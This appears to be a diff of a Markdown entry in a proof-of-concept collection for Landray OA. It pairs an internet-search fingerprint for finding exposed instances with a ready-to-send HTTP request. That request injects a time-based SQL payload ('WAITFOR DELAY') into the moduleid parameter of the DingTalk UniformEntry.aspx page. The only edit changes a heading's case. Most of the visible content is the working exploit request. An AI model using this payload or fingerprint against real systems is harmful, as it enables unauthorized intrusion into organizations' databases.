@@ -8,7 +8,7 @@
 icon_hash="953405444"||app="Landray-OA系统"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1;WAITFOR+DELAY+'0:0:5'-- + HTTP/1.1
